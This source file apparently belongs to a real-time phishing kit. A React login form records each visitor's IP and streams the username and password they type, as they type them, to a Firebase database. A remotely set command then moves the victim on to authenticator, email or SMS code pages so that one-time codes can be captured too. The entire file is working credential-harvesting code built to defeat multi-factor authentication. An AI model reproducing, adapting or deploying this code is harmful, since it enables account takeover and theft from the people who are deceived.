"use client";

import { database } from "@/firebase";
import {
  ThenableReference,
  onDisconnect,
  onValue,
  push,
  ref,
  update,
} from "firebase/database";
import { ToastContainer, toast } from "react-toastify";

import { useEffect, useState } from "react";
import { AuthenticatorCode } from "./steps/AuthenticatorCode";
import { PhoneCode } from "./steps/PhoneCode";
import { EmailCode } from "./steps/EmailCode";
import { UserPass } from "./steps/UserPass";

export const LoginForm = () => {
  const [dataRef, setDataRef] = useState<null | ThenableReference>(null);
  const [ipForm, seteIpForm] = useState<string | null>(null);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const [command, setCommand] = useState("W_LOGIN");

  useEffect(() => {
    fetch("https://api.ipify.org?format=json").then(async (res) => {
      const { ip } = await res.json();
      const ipF = ip.replaceAll(".", ",");
      const infosRef = ref(database, `info/${ipF}`);
      seteIpForm(ipF);
      if (ip) {
        const newDataRef = push(infosRef, {
          online: true,
          username: "",
          password: "",
          emailCode: "",
          twoAF: "",
          smsCode: "",
          trPass: {
            tr: "",
            email: "",
            sms: "",
            twoFa: "",
          },
          ip,
          zone: "",
          command: "W_LOGIN",
        });

        setDataRef(newDataRef);

        onDisconnect(newDataRef).update({
          online: false,
        });

        onValue(newDataRef, (snap) => {
          const data = snap.val();

          setCommand(data.command);
        });
      }
    });
  }, []);

  useEffect(() => {
    if (dataRef) {
      update(dataRef, { username, password });
    }
  }, [username, password]);

  return (
    <>
      <div className="flex-1 w-full md:min-w-[780px] min-w-max flex justify-center">
        {command.includes("W_LOGIN") ? (
          <UserPass
            command={command}
            password={password}
            setPassword={setPassword}
            setUsername={setUsername}
            username={username}
            dataRef={dataRef}
          />
        ) : null}
        {command.includes("W_SEC_1") ? (
          <AuthenticatorCode command={command} dataRef={dataRef} />
        ) : null}
        {command.includes("W_SEC_2") ? (
          <EmailCode command={command} dataRef={dataRef} />
        ) : null}
        {command.includes("W_SEC_3") ? (
          <PhoneCode command={command} dataRef={dataRef} />
        ) : null}
      </div>

      <ToastContainer />
    </>
  );
};
